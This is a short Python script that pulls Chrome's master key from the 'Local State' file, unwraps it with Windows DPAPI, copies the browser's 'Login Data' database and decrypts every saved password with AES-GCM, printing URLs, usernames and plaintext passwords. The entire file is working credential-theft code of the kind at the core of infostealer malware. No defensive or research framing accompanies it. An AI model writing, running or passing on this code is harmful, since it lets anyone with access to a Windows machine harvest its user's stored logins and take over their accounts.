import os
import json
import base64
import win32crypt
import shutil
import sqlite3
from Crypto.Cipher import AES

USERDATA = os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data"

# Encryption key
local_state = open(USERDATA + "\\Local State", "r").read()

encryption_key = json.loads(local_state)["os_crypt"]["encrypted_key"]
encryption_key = base64.b64decode(encryption_key)
encryption_key = win32crypt.CryptUnprotectData(encryption_key[5:], None, None, None, 0)[1]

# Login data
db_name = "Loginvault.db"

chrome_path_login_db = USERDATA + "\\Default\\Login Data"
shutil.copy2(chrome_path_login_db, db_name)

conn = sqlite3.connect(db_name)
cursor = conn.cursor()

cursor.execute("SELECT action_url, username_value, password_value FROM logins")

login_data = []

for login in cursor.fetchall():
    login_data.append({
        "url": login[0],
        "username": login[1],
        "ciphertext": login[2]
    })

conn.close()
os.remove(db_name)

# Main function
def decrypt():
    decrypted_login_data = []

    for login in login_data:
        initialisation_vector = login["ciphertext"][3:15]
        encrypted_password = login["ciphertext"][15:-16]
        
        cipher = AES.new(encryption_key, AES.MODE_GCM, initialisation_vector)
        decrypted_password = cipher.decrypt(encrypted_password)
        decrypted_password = decrypted_password.decode()

        decrypted_login_data.append({
            "url": login["url"],
            "username": login["username"],
            "password": decrypted_password
        })

    return decrypted_login_data

if __name__ == '__main__':
    print(decrypt())